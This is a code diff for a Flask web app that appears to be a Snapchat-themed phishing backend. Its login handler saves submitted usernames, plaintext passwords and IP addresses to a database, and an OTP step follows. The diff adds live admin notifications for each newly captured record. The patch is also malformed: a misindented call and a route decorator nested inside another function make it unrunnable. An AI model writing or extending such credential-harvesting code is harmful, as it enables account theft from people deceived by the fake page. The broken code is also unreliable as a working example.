@@ -1,15 +1,27 @@
-from flask import Flask, render_template, request, redirect, url_for, session, flash
+from flask import Flask, render_template, request, redirect, url_for, session, flash, Response
 import psycopg
 from urllib.parse import urlparse
 from datetime import datetime
-from zoneinfo import ZoneInfo
 import os
 import re
 from dotenv import load_dotenv
+import queue
+import threading
 
 load_dotenv()  # لتحميل متغيرات البيئة من ملف .env
 
 app = Flask(__name__)
+# عملاء صفحة الأدمن المتصلون بالإشعارات
+admin_clients = []
+
+clients_lock = threading.Lock()
+
+
+def notify_admins():
+    """إرسال إشعار عام عند إضافة سجل جديد"""
+    with clients_lock:
+        for client_queue in admin_clients:
+            client_queue.put("NEW_RECORD")
 app.secret_key = os.environ.get('SECRET_KEY', 'snapchat-secret-key-2024')
 
 # الاتصال بقاعدة PostgreSQL
@@ -60,7 +72,7 @@ def handle_login():
     username = request.form['username']
     password = request.form['password']
     ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
-    timestamp = datetime.now(ZoneInfo("Asia/Muscat")).replace(tzinfo=None)
+    timestamp = datetime.now()
 
     if not re.match(r'^[A-Za-z0-9_]+$', username) or not re.match(r'^[A-Za-z0-9_]+$', password):
         flash('اسم المستخدم وكلمة المرور يجب أن تكون بالأحرف الإنجليزية فقط.')
@@ -75,6 +87,7 @@ def handle_login():
     ''', (username, password, timestamp, ip_address))
     login_id = cursor.fetchone()[0]
     conn.commit()
+	notify_admins()
     conn.close()
 
     session['username'] = username
@@ -101,6 +114,39 @@ def verify_otp():
         conn.close()
 
     return redirect("snapchat://add/maymona19")
+	
+	@app.route('/admin/notifications')
+def admin_notifications():
+
+    client_queue = queue.Queue()
+
+    with clients_lock:
+        admin_clients.append(client_queue)
+
+    def generate():
+        try:
+            while True:
+                message = client_queue.get()
+
+                # لا نرسل أي بيانات من السجل
+                yield f"data: {message}\n\n"
+
+        except GeneratorExit:
+            pass
+
+        finally:
+            with clients_lock:
+                if client_queue in admin_clients:
+                    admin_clients.remove(client_queue)
+
+    return Response(
+        generate(),
+        mimetype='text/event-stream',
+        headers={
+            'Cache-Control': 'no-cache',
+            'X-Accel-Buffering': 'no'
+        }
+    )
 
 @app.route('/admin')
 def admin():
